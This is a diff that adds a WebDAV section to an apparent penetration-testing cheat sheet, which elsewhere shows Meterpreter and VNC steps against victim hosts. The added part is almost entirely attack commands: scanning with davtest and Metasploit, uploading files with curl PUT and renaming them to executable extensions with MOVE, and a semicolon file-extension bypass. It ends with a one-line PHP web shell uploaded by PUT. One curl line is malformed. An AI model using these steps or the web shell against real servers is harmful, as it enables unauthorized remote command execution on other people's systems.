@@ -15,6 +15,7 @@
 - [SMB](#SMB)
 - [Redis](#Redis)
 - [VNC](#VNC)
+- [Webdav](#Webdav)
 --------------------------------------------------------------------------------------------------------------------------------
 # Amazon_S3
 
@@ -756,4 +757,37 @@ meterpreter > run vnc
 sudo apt install tigervnc-viewer
 vncviewer [victim_ip]:[victim_port]
 ```
+-------------------------------------------------------------------------------------------------------------------------------------
+# Webdav
+
+### webdav scanner
+- davtest-url [victim_url]
+- davtest -move -senddb auto -url http://[victim_ip]:[victim_port]
+
+### metasploit
+- use auxiliary/scanner/http/webdav_scanner
+- use auxiliary/scanner/http/webdav_internal_ip
+- use auxiliary/scanner/http/webdav_website_content
+
+### test webdav by curl
+- echo xyz > test.txt
+- curl -X PUT http://[victim_ip]/test.txt -d @test.txt
+- curl https://[victim_ip]/test.txt
+
+###### change extension 
+- curl -X MOVE -H 'Destination http://[victim_ip/test.php] http://[victim_ip]/test.txt
+
+##### Semicolen file extension bypassing
+- upload file as file.asp;.jpg
+
+##### cadaver tool
+- cadaver http://[victim_ip]/path/
+  - dav:/path/> put file.txt
+  - dav:/path/> move file.txt file.asp;.txt
+  
+##### Use PUT method
+use burp
+PUT /test/shell.php
+
+<?php system($_GET["cmd"])?>
 -------------------------------------------------------------------------------------------------------------------------------------
